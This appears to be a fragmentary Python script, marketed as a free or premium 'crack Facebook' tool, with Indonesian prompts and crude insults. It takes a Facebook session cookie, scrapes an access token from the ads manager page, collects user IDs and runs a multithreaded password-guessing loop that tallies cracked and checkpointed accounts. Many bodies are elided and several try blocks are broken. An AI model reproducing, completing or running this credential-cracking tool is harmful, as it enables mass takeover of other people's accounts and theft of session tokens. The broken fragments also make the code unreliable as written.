...
{x}● VERSION: 1.7
● SCRIPT:FREE/CRACK FACEBOOK
● BUY-PREM?: 081243587205{x}""")

######## [ AYAM LONTE ] ########
def login():
	os.system('clear')
	lonte()
	cok = input(f'{h}>>MASUKAN COOKIE FACEBOOK :{h} ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {m}COOKIE KAMU INVALID / GANTI COOKIE LAIN KONTOL !!!');time.sleep(2);exit()
		else:
			for x in find:
				...
				exit(f"Token : {took} \n>>LOGIN BERHASIL JALANKAN ULANG SCRIPT NYA")
...
def menu():
	try:
		...
		print('[×] WELCOME TO SCRIPT ROLANDINO ⚡ ')
		time.sleep(6)
		login()
	try:
	...
	for user in uid:
	    try:
	      ...
	      pass
	        ...
	        exit()
	try:
	      print('[∆] TOTAL ID YANG TERKUMPUL : '+str(len(id))) 
	      setting() 
	except Exception as e:
	    print(e) 
	    exit()
...
def setting ():
	...
	print(f'{P}[•• ────────────────────────────────────────── ••]')
	pwplus=input(f'{P}[•] PASSWORD MANUAL? [ y/t ] : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'[•] Pw : {K}')
		pwkuh=pwku.split(',')
...
def passwrd():
	print(f'{P}[•• ────────────────────────────────────────── ••]')
	print(f'{H}          MODPES SETIAP 100 ID{P}')
	print(f'{P}[•• ────────────────────────────────────────── ••]')
	with tred(max_workers=30) as pool:
		for anim in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print(f'{M} ──────────────────────────────────────────{x}')
	print(f'{h}[•] ROLAND[OK] : {h}%s '%(ok))
	print(f'{k}[•] ROLAND[CP] : {k}%s '%(cp))
	print(f'{M} ──────────────────────────────────────────{x}')
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} JANGAN lUPA SEDEKAH NYA{x} << ')
		time.sleep(2)
		exit()
######## [ AYAM JAGO ] ########
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}⚡ROLANDINO⚡{P}|{P}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
	sys.stdout.flush()
	rr = random.randint
	rc = random.choice
